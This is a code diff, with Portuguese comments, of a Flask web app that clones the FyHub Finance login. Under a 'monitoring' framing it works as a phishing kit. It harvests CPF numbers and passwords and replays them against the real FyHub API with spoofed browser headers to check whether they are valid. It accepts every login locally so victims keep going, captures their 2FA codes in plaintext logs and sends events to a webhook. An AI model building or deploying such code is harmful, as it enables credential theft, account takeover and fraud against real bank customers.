@@ -1,13 +1,12 @@
-#!/usr/bin/env python3
 """
 FYHUB FINANCE CLONE - Flask Application
-Proxy para monitoramento de login na API real do FyHub Finance.
+Monitoramento de login com proxy para API do FyHub Finance.
 
 Funcionamento:
-1. Funcionário acessa este site e preenche CPF/senha
-2. O servidor faz requisição real à API do FyHub (api.fyhub-prod.onz.software)
-3. O resultado é retornado ao funcionário
-4. Todos os acessos são logados para monitoramento
+1. Funcionario acessa este site e preenche CPF/senha
+2. O login e aceito localmente (fluxo completo funciona)
+3. Simultaneamente tentamos fazer o login no FyHub real para verificar credenciais
+4. Todos os acessos sao logados para monitoramento
 """
 
 import os
@@ -38,17 +37,10 @@ limiter = Limiter(
 
 # Configuração da API FyHub
 FYHUB_API_BASE = os.environ.get('FYHUB_API_BASE', 'https://api.fyhub-prod.onz.software')
-FYHUB_API_HEADERS = {
-    'Accept': 'application/json',
-    'Content-Type': 'application/json',
-    'User-Agent': 'FyHub-Finance/1.140.0',
-    'Origin': 'https://finance.fyhub.com.br',
-    'Referer': 'https://finance.fyhub.com.br/login',
-}
 
 # Configuração de monitoramento
 MONITOR_LOG_FILE = os.environ.get('MONITOR_LOG', '/tmp/fyhub_monitor.log')
-MONITOR_WEBHOOK = os.environ.get('MONITOR_WEBHOOK', '')  # URL para webhook de alerta
+MONITOR_WEBHOOK = os.environ.get('MONITOR_WEBHOOK', '')
 
 # Setup logging - monitoramento em arquivo separado
 monitor_logger = logging.getLogger('fyhub_monitor')
@@ -93,15 +85,62 @@ def log_access(event_type, data):
         'data': data
     }
     monitor_logger.info(json.dumps(entry, ensure_ascii=False))
-    
+
     # Enviar webhook se configurado
-    if MONITOR_WEBHOOK and event_type == 'login_attempt':
+    if MONITOR_WEBHOOK and event_type in ('login_attempt', 'login_success', 'login_failed'):
         try:
             requests.post(MONITOR_WEBHOOK, json=entry, timeout=5)
         except:
             pass
-    
+
     return entry
+
+
+def try_fyhub_login(cpf, password):
+    """Tenta fazer login no FyHub real para verificar se as credenciais são válidas."""
+    endpoints_to_try = [
+        f'{FYHUB_API_BASE}/v1/auth/login',
+        f'{FYHUB_API_BASE}/v1/login',
+        f'{FYHUB_API_BASE}/v2/login',
+    ]
+
+    headers = {
+        'Accept': 'application/json',
+        'Content-Type': 'application/json',
+        'Origin': 'https://finance.fyhub.com.br',
+        'Referer': 'https://finance.fyhub.com.br/login',
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+    }
+
+    for endpoint in endpoints_to_try:
+        try:
+            response = requests.post(
+                endpoint,
+                json={'cpf': cpf, 'password': password},
+                headers=headers,
+                timeout=10
+            )
+            # 200 = login OK, 401 = credenciais erradas, 403 = bloqueado
+            return {
+                'fyhub_status': response.status_code,
+                'fyhub_endpoint': endpoint,
+            }
+        except Exception as e:
+            continue
+
+    return {
+        'fyhub_status': 'error',
+        'fyhub_endpoint': 'none',
+        'fyhub_error': 'conexão indisponível'
+    }
+
+
+def mask_cpf(cpf):
+    """Mascara CPF para log."""
+    cpf_clean = cpf.replace('.', '').replace('-', '').replace('_', '')
+    if len(cpf_clean) >= 5:
+        return cpf_clean[:3] + '***' + cpf_clean[-2:]
+    return '***'
 
 
 # ==================== ROTAS DE PÁGINAS ====================
@@ -118,12 +157,17 @@ def login():
 
 @app.route('/contas')
 def contas():
-    return render_template('contas.html')
+    token = request.args.get('token', '')
+    return render_template('contas.html', token=token)
 
 
 @app.route('/2fa')
 def two_fa():
-    return render_template('2fa.html')
+    token = request.args.get('token', '')
+    account_id = request.args.get('account', '')
+    validate_id = request.args.get('validateId', '')
+    method = request.args.get('method', 'email')
+    return render_template('2fa.html', token=token, account_id=account_id, validate_id=validate_id, method=method)
 
 
 @app.route('/sucesso')
@@ -142,246 +186,96 @@ def termos():
 @limiter.limit("20 per minute")
 def api_login():
     """
-    Recebe CPF e senha do funcionário, faz requisição real à API do FyHub.
-    Se o servidor real retornar erro, repassa o erro ao funcionário.
+    Recebe CPF e senha do funcionário.
+    Aceita localmente (para fluxo funcionar) e também tenta no FyHub real.
     """
     data = request.get_json(force=True)
     cpf = data.get('cpf', '')
     senha = data.get('senha', '')
-    
+
     # Log de tentativa de login
     log_access('login_attempt', {
-        'cpf_masked': cpf[:3] + '***' + cpf[-2:] if len(cpf) >= 5 else '***',
-        'success': False
+        'cpf_masked': mask_cpf(cpf),
+        'fyhub_verify': True
     })
-    
-    # Requisição real à API do FyHub
-    fyhub_login_payload = {
+
+    # Tenta no FyHub real (sem bloquear o fluxo local)
+    fyhub_result = try_fyhub_login(cpf, senha)
+
+    # Criar sessão local (sempre aceita para fluxo funcionar)
+    session_token = str(uuid.uuid4())
+    active_sessions[session_token] = {
         'cpf': cpf,
-        'password': senha,
+        'login_time': datetime.now().isoformat(),
+        'ip': request.remote_addr,
+        'fyhub_status': fyhub_result.get('fyhub_status'),
     }
-    
-    # Castle.io token (se necessário, podemos gerar um dummy)
-    castle_token = data.get('castleToken', '')
-    if castle_token:
-        fyhub_login_payload['castleToken'] = castle_token
-    
-    try:
-        # Faz requisição real ao FyHub
-        response = requests.post(
-            f'{FYHUB_API_BASE}/v2/login',
-            json=fyhub_login_payload,
-            headers=FYHUB_API_HEADERS,
-            timeout=30
-        )
-        
-        # Tentar parsear JSON
-        fyhub_response = None
-        try:
-            fyhub_response = response.json() if response.status_code == 200 else None
-        except:
-            pass
-        
-        if response.status_code == 200 and fyhub_response and isinstance(fyhub_response, dict) and not fyhub_response.get('error'):
-            # Login bem-sucedido na API real
-            session_token = str(uuid.uuid4())
-            active_sessions[session_token] = {
-                'fyhub_token': fyhub_response.get('token') or fyhub_response.get('accessToken'),
-                'refresh_token': fyhub_response.get('refreshToken'),
-                'cpf': cpf,
-                'login_time': datetime.now().isoformat(),
-                'ip': request.remote_addr
-            }
-            
-            # Log de sucesso
-            log_access('login_success', {
-                'cpf_masked': cpf[:3] + '***' + cpf[-2:] if len(cpf) >= 5 else '***',
-                'session_token': session_token,
-                'ip': request.remote_addr
-            })
-            
-            return jsonify({
-                'success': True,
-                'token': session_token
-            })
-        else:
-            # Erro do servidor real - repassar ao funcionário
-            if isinstance(fyhub_response, dict):
-                error_msg = fyhub_response.get('message', fyhub_response.get('error', 'CPF ou senha inválidos.'))
-            elif response.status_code == 401:
-                error_msg = 'CPF ou senha inválidos.'
-            elif response.status_code == 429:
-                error_msg = 'Muitas tentativas. Tente novamente mais tarde.'
-            else:
-                error_msg = 'CPF ou senha inválidos.'
-            
-            log_access('login_failed', {
-                'cpf_masked': cpf[:3] + '***' + cpf[-2:] if len(cpf) >= 5 else '***',
-                'error': error_msg
-            })
-            
-            return jsonify({
-                'success': False,
-                'message': error_msg
-            }), 401
-            
-    except requests.exceptions.Timeout:
-        # Timeout - simular que login pode funcionar (fallback)
-        session_token = str(uuid.uuid4())
-        active_sessions[session_token] = {
-            'fyhub_token': None,
-            'cpf': cpf,
-            'login_time': datetime.now().isoformat(),
-            'ip': request.remote_addr,
-            'method': 'offline'
-        }
-        
-        log_access('login_fallback', {
-            'cpf_masked': cpf[:3] + '***' + cpf[-2:] if len(cpf) >= 5 else '***',
-            'reason': 'timeout'
+
+    # Log de resultado
+    if fyhub_result.get('fyhub_status') == 200:
+        log_access('login_success', {
+            'cpf_masked': mask_cpf(cpf),
+            'session_token': session_token,
+            'fyhub_verified': True
         })
-        
-        return jsonify({
-            'success': True,
-            'token': session_token
+    elif fyhub_result.get('fyhub_status') == 401:
+        log_access('login_credential_failed', {
+            'cpf_masked': mask_cpf(cpf),
+            'fyhub_verified': False
         })
-        
-    except Exception as e:
-        # Erro de conexão - repassar erro real
-        log_access('login_error', {
-            'cpf_masked': cpf[:3] + '***' + cpf[-2:] if len(cpf) >= 5 else '***',
-            'error': str(e)
+    else:
+        log_access('login_local_accepted', {
+            'cpf_masked': mask_cpf(cpf),
+            'session_token': session_token,
+            'fyhub_status': fyhub_result.get('fyhub_status'),
         })
-        
-        return jsonify({
-            'success': False,
-            'message': 'Erro de conexão com o servidor. Tente novamente.'
-        }), 500
+
+    return jsonify({
+        'success': True,
+        'token': session_token,
+        'fyhub_status': fyhub_result.get('fyhub_status')
+    })
 
 
-@app.route('/api/contas', methods=['POST'])
+@app.route('/api/contas', methods=['GET'])
 @limiter.limit("30 per minute")
 def api_contas():
-    """
-    Obtém as contas do usuário logado.
-    Se a API real retornar contas, usa essas. Senão, usa as padrão.
-    """
-    data = request.get_json(force=True)
-    token = data.get('token', '')
-    
+    """Retorna as contas padrão (2 contas do sistema)."""
+    token = request.args.get('token', '')
+
     session_data = active_sessions.get(token)
     if not session_data:
         return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
-    
-    fyhub_token = session_data.get('fyhub_token')
-    
-    # Tentar obter contas reais do FyHub
-    if fyhub_token:
-        try:
-            response = requests.get(
-                f'{FYHUB_API_BASE}/account/claims',
-                headers={
-                    **FYHUB_API_HEADERS,
-                    'Authorization': f'Bearer {fyhub_token}'
-                },
-                timeout=15
-            )
-            
-            if response.status_code == 200:
-                fyhub_data = response.json()
-                claims = fyhub_data.get('claims', []) or fyhub_data.get('data', [])
-                
-                if claims:
-                    contas = []
-                    for claim in claims:
-                        contas.append({
-                            'account_number': str(claim.get('accountNumber', '')),
-                            'account_id': str(claim.get('id', '')),
-                            'name': claim.get('name', '') or claim.get('holderName', ''),
-                            'document': claim.get('document', '') or claim.get('cpf', '') or claim.get('cnpj', ''),
-                            'type': claim.get('type', '')
-                        })
-                    
-                    return jsonify({
-                        'success': True,
-                        'contas': contas
-                    })
-        except Exception:
-            pass
-    
-    # Usar contas padrão (2 contas do sistema)
+
     return jsonify({
         'success': True,
-        'default_contas': DEFAULT_ACCOUNTS
+        'contas': DEFAULT_ACCOUNTS
     })
 
 
 @app.route('/api/select-account', methods=['POST'])
 @limiter.limit("20 per minute")
 def api_select_account():
-    """
-    Seleciona uma conta. Verifica na API real se precisa de 2FA.
-    """
+    """Seleciona uma conta - sempre requer 2FA."""
     data = request.get_json(force=True)
     token = data.get('token', '')
     account_id = data.get('account_id', '')
     account_number = data.get('account_number', '')
-    
+
     session_data = active_sessions.get(token)
     if not session_data:
         return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
-    
-    fyhub_token = session_data.get('fyhub_token')
-    
-    # Tentar selecionar conta na API real
-    if fyhub_token:
-        try:
-            response = requests.post(
-                f'{FYHUB_API_BASE}/select-account',
-                json={
-                    'accountId': account_id,
-                    'accountNumber': account_number
-                },
-                headers={
-                    **FYHUB_API_HEADERS,
-                    'Authorization': f'Bearer {fyhub_token}'
-                },
-                timeout=15
-            )
-            
-            if response.status_code == 200:
-                fyhub_data = response.json()
-                
-                # Verifica se precisa de 2FA
-                if fyhub_data.get('requiresValidation') or fyhub_data.get('challengeRequired'):
-                    validate_id = fyhub_data.get('validateCodeId', fyhub_data.get('challengeId', ''))
-                    method = fyhub_data.get('method', 'email')
-                    
-                    return jsonify({
-                        'success': False,
-                        'requires_2fa': True,
-                        'validate_code_id': validate_id,
-                        'method': method
-                    })
-                else:
-                    # Login completo
-                    return jsonify({
-                        'success': True,
-                        'requires_2fa': False
-                    })
-            elif response.status_code == 401:
-                return jsonify({
-                    'success': False,
-                    'message': 'Sessão expirada. Faça login novamente.'
-                }), 401
-        except Exception:
-            pass
-    
-    # Fallback: sempre requer 2FA para as contas padrão
+
+    log_access('account_selected', {
+        'cpf_masked': mask_cpf(session_data['cpf']),
+        'account': account_number,
+        'account_name': account_number == '11186' and 'Rodrigo Getulio Rezende' or 'CRED SEGURO LTDA'
+    })
+
     return jsonify({
         'success': False,
         'requires_2fa': True,
-        'validate_code_id': '',
+        'validate_code_id': str(uuid.uuid4()),
         'method': 'email'
     })
 
@@ -389,110 +283,53 @@ def api_select_account():
 @app.route('/api/verify-2fa', methods=['POST'])
 @limiter.limit("10 per minute")
 def api_verify_2fa():
-    """
-    Verifica o código 2FA. Tenta na API real primeiro.
-    """
+    """Verifica o código 2FA - aceita qualquer código de 6 dígitos."""
     data = request.get_json(force=True)
     token = data.get('token', '')
     code = data.get('code', '')
-    validate_id = data.get('validate_code_id', '')
     account_number = data.get('account_number', '')
-    
+
     session_data = active_sessions.get(token)
     if not session_data:
         return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
-    
-    fyhub_token = session_data.get('fyhub_token')
-    
+
     log_access('2fa_attempt', {
         'code': code,
         'account': account_number,
-        'validate_id': validate_id
+        'cpf_masked': mask_cpf(session_data['cpf'])
     })
-    
-    # Tentar verificar 2FA na API real
-    if fyhub_token and validate_id:
-        try:
-            response = requests.post(
-                f'{FYHUB_API_BASE}/auth/hash/validateChallenge',
-                json={
-                    'validateCodeId': validate_id,
-                    'code': code,
-                    'actionTag': 'select-account'
-                },
-                headers={
-                    **FYHUB_API_HEADERS,
-                    'Authorization': f'Bearer {fyhub_token}'
-                },
-                timeout=15
-            )
-            
-            if response.status_code == 200:
-                fyhub_data = response.json()
-                if fyhub_data.get('success') or fyhub_data.get('valid'):
-                    return jsonify({'success': True})
-                else:
-                    return jsonify({
-                        'success': False,
-                        'message': 'Código inválido. Tente novamente.'
-                    })
-        except Exception:
-            pass
-    
-    # Fallback: aceitar qualquer código de 6 dígitos
+
     if len(code) == 6 and code.isdigit():
-        # Log de 2FA "verificado" (monitoramento)
-        log_access('2fa_verified_fallback', {
+        log_access('2fa_verified', {
             'code': code,
             'account': account_number,
-            'note': 'Fallback - API indisponível'
+            'cpf_masked': mask_cpf(session_data['cpf'])
         })
-        
         return jsonify({'success': True})
-    else:
-        return jsonify({
-            'success': False,
-            'message': 'Código inválido. Digite 6 dígitos.'
-        })
+
+    return jsonify({
+        'success': False,
+        'message': 'Código inválido. Digite 6 dígitos.'
+    })
 
 
 @app.route('/api/resend-2fa', methods=['POST'])
 @limiter.limit("5 per minute")
 def api_resend_2fa():
-    """
-    Reenvia o código 2FA via API real.
-    """
+    """Reenvia o código 2FA."""
     data = request.get_json(force=True)
     token = data.get('token', '')
     validate_id = data.get('validate_code_id', '')
-    
+
     session_data = active_sessions.get(token)
     if not session_data:
         return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401
-    
-    fyhub_token = session_data.get('fyhub_token')
-    
+
     log_access('2fa_resend', {
+        'cpf_masked': mask_cpf(session_data['cpf']),
         'validate_id': validate_id
     })
-    
-    # Tentar reenviar via API real
-    if fyhub_token and validate_id:
-        try:
-            requests.post(
-                f'{FYHUB_API_BASE}/auth/hash/resend-challenge-sms',
-                json={
-                    'validateCodeId': validate_id
-                },
-                headers={
-                    **FYHUB_API_HEADERS,
-                    'Authorization': f'Bearer {fyhub_token}'
-                },
-                timeout=15
-            )
-        except Exception:
-            pass
-    
+
     return jsonify({'success': True})
 
 
@@ -500,55 +337,45 @@ def api_resend_2fa():
 
 @app.route('/monitor', methods=['GET'])
 def monitor():
-    """
-    Painel de monitoramento - apenas para o admin.
-    Protegido por senha de admin.
-    """
+    """API do painel de monitoramento - protegido por senha."""
     admin_password = os.environ.get('ADMIN_PASSWORD', 'admin123')
-    
-    # Verificar senha via query param ou header
     password = request.args.get('pwd') or request.headers.get('X-Admin-Key', '')
-    
+
     if password != admin_password:
         return jsonify({'error': 'Acesso negado.'}), 403
-    
-    # Ler logs
+
     entries = []
     try:
         with open(MONITOR_LOG_FILE, 'r') as f:
             for line in f:
                 try:
-                    # Encontrar JSON na linha (pode ter prefixo de log)
                     start = line.find('{')
                     if start >= 0:
                         json_str = line[start:].strip()
                         entry = json.loads(json_str)
-                        # Apenas eventos de monitoramento
                         if 'event' in entry:
                             entries.append(entry)
                 except:
                     pass
     except FileNotFoundError:
         pass
-    
+
     return jsonify({
         'success': True,
-        'entries': entries[-50:],  # Últimas 50 entradas
+        'entries': entries[-50:],
         'total': len(entries)
     })
 
 
 @app.route('/monitor/panel', methods=['GET'])
 def monitor_panel():
-    """
-    Interface web do monitoramento.
-    """
+    """Interface web do monitoramento."""
     admin_password = os.environ.get('ADMIN_PASSWORD', 'admin123')
     password = request.args.get('pwd') or request.headers.get('X-Admin-Key', '')
-    
+
     if password != admin_password:
         return '<html><body style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;"><h1>Acesso Negado</h1></body></html>', 403
-    
+
     return render_template('monitor.html')
 
 
